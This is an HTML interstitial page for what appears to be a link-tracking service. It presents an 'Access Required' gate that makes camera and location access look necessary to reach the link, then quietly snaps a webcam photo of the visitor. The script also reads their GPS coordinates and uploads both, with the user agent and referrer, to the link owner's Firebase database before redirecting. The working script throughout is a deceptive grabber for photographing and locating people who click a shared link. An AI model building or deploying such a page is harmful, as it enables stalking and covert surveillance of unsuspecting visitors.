<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Access Required</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            margin: 0;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 20px;
            padding: 40px;
            max-width: 500px;
            text-align: center;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }
        button {
            background: #667eea;
            color: white;
            border: none;
            padding: 12px 30px;
            border-radius: 25px;
            font-size: 16px;
            cursor: pointer;
            margin: 10px;
        }
        button:hover {
            background: #764ba2;
        }
        video {
            width: 100%;
            border-radius: 10px;
            margin-top: 20px;
        }
        canvas {
            display: none;
        }
        .status {
            margin-top: 20px;
            padding: 10px;
            border-radius: 10px;
        }
        .success {
            background: #d4edda;
            color: #155724;
        }
        .error {
            background: #f8d7da;
            color: #721c24;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>🔐 Access Required</h2>
        <p>The link owner needs following permissions:</p>
        <div id="permissions"></div>
        <button onclick="grantAccess()">✅ Grant Access & Continue</button>
        <div id="status"></div>
        <video id="video" autoplay playsinline></video>
        <canvas id="canvas"></canvas>
    </div>

    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>

    <script>
        // Firebase Config (same as index.html)
        const firebaseConfig = {
            apiKey: "YOUR_API_KEY",
            authDomain: "YOUR_AUTH_DOMAIN",
            databaseURL: "YOUR_DATABASE_URL",
            projectId: "YOUR_PROJECT_ID",
            storageBucket: "YOUR_STORAGE_BUCKET",
            messagingSenderId: "YOUR_MESSAGING_SENDER_ID",
            appId: "YOUR_APP_ID"
        };

        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();

        let trackingData = null;
        let stream = null;

        // Load tracking data
        const savedTracking = sessionStorage.getItem('hj_tracking');
        if (savedTracking) {
            trackingData = JSON.parse(savedTracking);
            displayPermissions();
        } else {
            document.getElementById('permissions').innerHTML = '<p>No tracking required. Redirecting...</p>';
            setTimeout(() => {
                window.location.href = sessionStorage.getItem('redirect_url') || '/';
            }, 2000);
        }

        function displayPermissions() {
            let html = '<ul>';
            if (trackingData.captureCamera) html += '<li>📸 Camera Access (Photo will be captured)</li>';
            if (trackingData.captureLocation) html += '<li>📍 Location Access (GPS coordinates)</li>';
            html += '</ul>';
            document.getElementById('permissions').innerHTML = html;
        }

        async function grantAccess() {
            const statusDiv = document.getElementById('status');
            const results = {};

            try {
                // Camera access
                if (trackingData.captureCamera) {
                    statusDiv.innerHTML = '<div class="status">📸 Requesting camera access...</div>';
                    try {
                        stream = await navigator.mediaDevices.getUserMedia({ video: true });
                        const video = document.getElementById('video');
                        video.srcObject = stream;
                        
                        // Capture photo after 1 second
                        await new Promise(resolve => setTimeout(resolve, 1000));
                        
                        const canvas = document.getElementById('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        
                        const photoData = canvas.toDataURL('image/jpeg', 0.8);
                        results.photo = photoData;
                        
                        statusDiv.innerHTML = '<div class="status success">✅ Camera access granted!</div>';
                    } catch (err) {
                        console.error("Camera error:", err);
                        results.photoError = err.message;
                        statusDiv.innerHTML = '<div class="status error">❌ Camera access denied</div>';
                    }
                }

                // Location access
                if (trackingData.captureLocation) {
                    statusDiv.innerHTML += '<div class="status">📍 Requesting location...</div>';
                    try {
                        const position = await new Promise((resolve, reject) => {
                            navigator.geolocation.getCurrentPosition(resolve, reject);
                        });
                        results.location = {
                            lat: position.coords.latitude,
                            lng: position.coords.longitude,
                            accuracy: position.coords.accuracy
                        };
                        statusDiv.innerHTML += '<div class="status success">✅ Location access granted!</div>';
                    } catch (err) {
                        console.error("Location error:", err);
                        results.locationError = err.message;
                        statusDiv.innerHTML += '<div class="status error">❌ Location access denied</div>';
                    }
                }

                // Save tracking data to Firebase
                const domain = window.location.hostname;
                const shortCode = trackingData.shortCode;
                const encodedDomain = btoa(domain).replace(/=+$/, '');
                
                await database.ref(`tracking/${encodedDomain}/${shortCode}/${Date.now()}`).set({
                    ...results,
                    userAgent: navigator.userAgent,
                    timestamp: Date.now(),
                    referrer: document.referrer
                });

                statusDiv.innerHTML += '<div class="status success">✅ Tracking data saved!</div>';
                
                // Stop camera stream
                if (stream) {
                    stream.getTracks().forEach(track => track.stop());
                }
                
                // Redirect after 2 seconds
                setTimeout(() => {
                    const redirectUrl = sessionStorage.getItem('redirect_url');
                    if (redirectUrl) {
                        window.location.href = redirectUrl;
                    } else {
                        window.location.href = '/';
                    }
                }, 2000);
                
            } catch (error) {
                console.error("Error:", error);
                statusDiv.innerHTML += `<div class="status error">❌ Error: ${error.message}</div>`;
            }
        }
    </script>
</body>
</html>
